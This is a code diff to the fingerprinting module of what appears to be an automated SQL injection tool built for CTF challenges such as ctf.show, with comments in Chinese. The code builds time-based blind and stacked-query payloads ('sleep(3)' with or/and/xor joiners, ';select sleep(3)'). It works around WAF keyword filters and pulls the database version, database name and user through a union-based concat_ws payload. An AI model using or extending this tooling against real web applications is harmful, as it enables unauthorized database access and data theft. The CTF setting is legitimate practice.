@@ -54,8 +54,10 @@ class Fingerprinter:
             if fp.boolean_oracle:
                 break
 
-        # 时间盲注（逐 joiner 尝试：and 被拦时 or/arith 仍可能延时）
-        if not waf.is_filtered("sleep"):
+        # 时间盲注（有 union 回显时无意义：省 4×sleep 的十几秒）
+        if fp.echo_visible:
+            notes.append("已有回显位，跳过时间盲注探测")
+        elif not waf.is_filtered("sleep"):
             for joiner in ("or", "and", "xor", "arith"):
                 r = self.s.request_value(self._cond_payload("sleep(3)", joiner))
                 if r.elapsed_ms >= 2800:
@@ -65,7 +67,10 @@ class Fingerprinter:
             notes.append("sleep 被过滤，时间盲注判定受限")
 
         # 堆叠（select 被滤时用 SET @a=sleep 探测，绕开关键字依赖）
-        if not waf.is_filtered(";"):
+        # 有回显位时堆叠对解题不是必需：跳过，省 sleep(3) 的几次等待
+        if fp.echo_visible:
+            pass
+        elif not waf.is_filtered(";"):
             if not waf.is_filtered("select"):
                 core = apply_form(";select sleep(3)", self.inj.form)
                 r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
@@ -138,7 +143,8 @@ class Fingerprinter:
             return
         # 默认 MySQL：版本/库/用户一并取回
         body = self._union_echo("concat_ws(0x7e,version(),database(),user())")
-        m = re.search(r"([0-9]+\.[0-9]+\.[0-9]+[^~\s<]*)~([^~\s<]+)~([^~\s<]+)", body)
+        # 排除双引号：JSON 回显（如 ctf.show api）中 user() 后面紧跟 `","username":`
+        m = re.search(r'([0-9]+\.[0-9]+\.[0-9]+[^~\s<"]*)~([^~\s<"]+)~([^~\s<"]+)', body)
         if m:
             fp.version, fp.current_db, fp.current_user = m.groups()
         fp.dbms = "MySQL"
@@ -157,7 +163,7 @@ class Fingerprinter:
         if not self.inj.closure:
             pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
         r = self.s.request_value(f"{pre}{core}{self.inj.comment}")
-        m = re.search(r"([0-9]+\.[0-9]+\.[0-9]+[^\s~]*)~([^~\s<]+)~([^\s~<]+)", r.body)
+        m = re.search(r'([0-9]+\.[0-9]+\.[0-9]+[^\s~"]*)~([^~\s<"]+)~([^\s~<"]+)', r.body)
         if m:
             fp.version, fp.current_db, fp.current_user = m.group(1), m.group(2), m.group(3)
 
